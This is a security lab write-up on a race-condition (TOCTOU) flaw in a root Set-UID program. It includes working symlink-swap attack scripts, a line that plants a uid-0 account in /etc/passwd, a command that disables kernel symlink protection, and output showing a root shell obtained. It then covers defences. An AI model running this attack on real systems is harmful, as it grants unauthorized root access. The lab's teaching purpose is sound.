# SEEDlabs: Race Condition Vulnerability Lab

## Lab Overview
A race condition occurs when multiple processes access and manipulate the same data concurrently, and the outcome of the execution depends on the particular order in which the access takes place. If a privileged program has a race-condition vulnerability, attackers can run a parallel process to "race" against the privileged program, with an intention to change the behaviors of the program.

## Guidelines

### Two Potential Targets
There are possibly many ways to exploit the race condition vulnerability in `vulp.c`. One way is to use the vulnerability to append some information to both `/etc/passwd` and `/etc/shadow`. These two files are used by Unix operating systems to authenticate users. If attackers can add information to these two files, they essentially have the power to create new users, including super-users (by letting uid to be zero).

The `/etc/passwd` file is the authentication database for a Unix machine. It contains basic user attributes. This is an ASCII file that contains an entry for each user. Each entry defines the basic attributes applied to a user. When you use the `adduser` command to add a user to your system, the command updates the `/etc/passwd` file.

The file `/etc/passwd` has to be world readable, because many application programs need to access user attributes, such as user-names, home directories, etc. Saving an encrypted password in that file would mean that anyone with access to the machine could use password cracking programs (such as crack) to break into the accounts of others. To fix this problem, the shadow password system was created. The `/etc/passwd` file in the shadow system is world-readable but does not contain the encrypted passwords. Another file, `/etc/shadow`, which is readable only by root contains the passwords.

To find out what strings to add to these two files, run adduser, and see what are added to these files. For example, the followings are what have been added to these files after creating a new user called `smith`:
```
root@ubuntu:/home/seed# useradd -d /usr/smith -m smith
root@ubuntu:/home/seed# cat /etc/passwd | grep smith
smith:x:1002:1003::/usr/smith:/bin/sh
root@ubuntu:/home/seed# cat /etc/shadow | grep smith
smith:!:17025:0:99999:7:::
```
The third column in the file `/etc/passwd` denotes the UID of the user. Because `smith` account is a regular user account, its value 1000 is nothing special. If we change this entry to 0, `smith` now becomes `root`.

### Creating symbolic links
You can call C function `symlink()` to create symbolic links in your program. Since Linux does not allow one to create a link if the link already exists, we need to delete the old link first. The following C code snippet show how to remove a link and then make `/tmp/XYZ` point to `/etc/passwd`:
```
unlink("/tmp/XYZ");
symlink("/etc/passwd","/tmp/XYZ");
```
You can also use Linux command `ln -sf` to create symbolic links. Here the `f` option means that if the link exists, remove the old one first. The implementation of the `ln` command actually uses `unlinks()` and `symlink()`.

### Improving success rate
The most critical step (i.e., pointing the link to our target file) of a race-condition attack must occur within the window between check and use; namely between the `access` and the `fopen` calls in `vulp.c`. Since we cannot modify the vulnerable program, the only thing that we can do is to run our attacking program in parallel with the target program, hoping that the change of the link does occur within that critical window. Unfortunately, we cannot achieve the perfect timing. Therefore, the success of attack is probabilistic. The probability of successful attack might be quite low if the window are small. You need to think about how to increase the probability (Hints: you can run the vulnerable program for many times; you only need to achieve success once among all these trials).

Since you need to run the attacks and the vulnerable program for many times, you need to write a program to automate the attack process. To avoid manually typing an input to `vulp`, you can use redirection. Namely, you type your input in a file, and then redirect this file when you run `vulp`. For example, you can use the following: `vulp < FILE`.

### Knowing whether the attack is successful
Since the user does not have the read permission for accessing `/etc/shadow`, there is no way of knowing if it was modified. The only way that is possible is to see its time stamps. Also it would be better if we stop the attack once the entries are added to the respective files. The following shell script checks if the time stamps of `/etc/shadow` has been changed. It prints a message once the change is noticed.
```
#!/bin/sh

old=`ls -l /etc/shadow`
new=`ls -l /etc/shadow`
while [ "$old" = "$new" ]
do 
    new=`ls -l /etc/shadow`
done
echo "STOP... The shadow file has been changed"
```

### An Undesirable Situation
While testing your attack program, you may find out that `/tmp/XYZ` is created with root being its owner. If this happens, you have lost the "race", i.e., the file is somehow created by the root. Once that happens, there is no way you can remove this file. This is because the `/tmp` folder has a "sticky" bit on, meaning that only the owner of the file can delete the file, even though the folder is world-writable.

If this happens, you need to adjust your attack strategy, and try it again (of course, after manually removing the file from the root account). The main reason for this to happen is that the attack program is context switched out right after it removes `/tmp/XYZ`, but before it links the name to another file. Remember, the action to remove the existing symbolic link and create a new one is not atomic (it involves two separate system calls), so if the context switch occurs in the middle (i.e., right after the removal of `/tmp/XYZ`), and the target Set-UID program gets a chance to run its `fopen(fn, "a+")` statement, it will create a new file with root being the owner. Think about a strategy that can minimize the chance to get context switched in the middle of that action.

### Warning
In the past, some students accidentally emptied the `/etc/shadow` file during the attacks (we still do not know what has caused that). If you lose the shadow file, you will not be able to login again. To avoid this trouble, please make a copy of the original shadow file.

## Lab Tasks

### Initial setup
Ubuntu 11.04 and 12.04 come with an built-in protection against race condition attacks. This scheme works by restricting who can follow a symlink. According to the documentation, "symlinks in world-writable sticky directories (e.g. `/tmp`) cannot be followed if the follower and directory owner do not match the symlink owner." In this lab, we need to disable this protection.
```
sudo sysctl -w kernel.yama.protected_sticky_symlinks=0
```

### A Vulnerable Program
The following program is a seemingly harmless program. It contains a race-condition vulnerability.
```
// vulp.c

#include<stdio.h>
#include<unistd.h>

int main()
{
    char * fn = "/tmp/XYZ";
    char buffer[60];
    FILE *fp;
    
    // get user input
    scanf("%50s", buffer);
    
    if(!access(fn, W_OK)) {
        fp = fopen(fn, "a+");
        fwrite("\n", sizeof(char), 1, fp);
        fwrite(buffer, sizeof(char), strlen(buffer), fp);
        fclose(fp);
    }
    else printf("NO permission\n");
}
```
This is part of a Set-UID program (owned by `root`); it appends a string of user input to the end of a temporary file `/tmp/XYZ`. Since the code runs with the root privilege, it carefully checks whether the real user actually has the access permission to the file `/tmp/XYZ`; that is the purpose of the `access()` call. Once the program has made sure that the real user indeed has the right, the program opens the file and writes the user input into the file.

It appears that the program does not have any problem at the first look. However, there is a race condition vulnerability in this program: due to the window (the simulated delay) between the check (`access`) and the use (`fopen`), there is a possibility that the file used by `access` is different from the file used by `fopen`, even though they have the same file name `/tmp/XYZ`. If a malicious attacker can somehow make `/tmp/XYZ` a symbolic link pointing to `/etc/shadow`, the attacker can cause the user input to be appended to `/etc/shadow` (note that the program runs with the root privilege, and can therefore overwrite any file).

### Task 1: Exploit the Race Condition Vulnerabilities
You need to exploit the race condition vulnerability in the above Set-UID program. More specifically, you need to achieve the following:
- Overwrite any file that belongs to root.
- Gain root privileges; namely, you should be able to do anything that root can do.

Our attack script:
```
#!/bin/sh
# attack.sh
race()
{
	old=`ls -l /etc/passwd`
	old=`ls -l /etc/passwd`
	while [ "$old"="$new" ]
	do
		rm -f /tmp/XYZ
		>/tmp/XYZ
		ln -sf /etc/passwd /tmp/XYZ
		new=`ls -l /etc/passwd`
	done
}

race
echo "Stop... The passwd has been changed!"
RACE_PID=$!
kill $RACE_PID
```
Loop execution script:
```
#!/bin/sh
# loop.sh
race()
{
	while true
	do
		./vulp < attack_input
	done
}

race
RACE_PID=$!
kill $RACE_PID
```
Content in attack_input:
```
smith:ttXydORJt50wQ:0:0::/home:/bin/sh
```
Now, let's attack it.
```
seed@ubuntu:~$ ls -al vulp* attack* loop.sh 
-rwxrwxrwx 1 seed seed   39 Aug 11 23:39 attack_input
-rwxrwxrwx 1 seed seed  268 Aug 11 23:02 attack.sh
-rwxrwxrwx 1 seed seed  102 Aug 11 23:44 loop.sh
-rws------ 1 root root 7403 Aug 11 23:22 vulp
-rwxrw-rw- 1 seed seed  301 Aug 11 23:42 vulp.c
seed@ubuntu:~$ ./loop.sh ; ./attack.sh
Stop... The passwd has been changed!
seed@ubuntu:~$ cat /etc/passwd | grep smith
smith:ttXydORJt50wQ:0:0::/home:/bin/sh
seed@ubuntu:~$ su smith 
Password: 
# id
uid=0(root) gid=0(root) groups=0(root)
```

### Task 2: Protection Mechanism A: Repeating
Getting rid of race conditions is not easy, because the check-and-use pattern is often necessary in programs. Instead of removing race conditions, we can actually add more race conditions, such that to compromise the security of the program, attackers need to win all these race conditions. If these race conditions are designed properly, we can exponentially reduce the winning probability for attackers. The basic idea is to repeat `access()` and `open()` for several times; at each time, we open the file, and at the end, we check whether the same file is opened by checking their `i-nodes` (they should be the same).

Please use this strategy to modigy the vulnerable program, and repeat your attack. Report how difficult it is to succeed, if you can still succeed.

### Task 3: Protection Mechanism B: Principle of Least Privilege
The fundamental problem of the vulnerable program in this lab is the violation of the
Principle of Least Privilege. The programmer does understand that the user who runs the program might be too powerful, so he/she introduced `access()` to limit the user's power. However, this is not the proper approach. A better approach is to apply the Principle of Least Privilege; namely,  if users do not need certain privilege, the privilege needs to be disabled.

We can use `seteuid` system call to temporarily disable the root privilege, and later enable it if necessary. Please use this approach to fix the vulnerability in the program, and then repeat your attack. Will you be able to succeed?

### Task 4: Protection Mechanism C: Ubuntu's Built-in Scheme
As we mentioned in the initial setup, Ubuntu 11.04 and 12.04 comes with a built-in protection scheme against race condition attacks. In this task, you need to turn the protection back on using the following command:
```
sudo sysctl -w kernel.yama.protected_sticky_symlinks=1
```
Please explain the followings:
- Why does this protection scheme works?
- Is this a good protection? Why or why not?
- What are the limitations of this scheme?
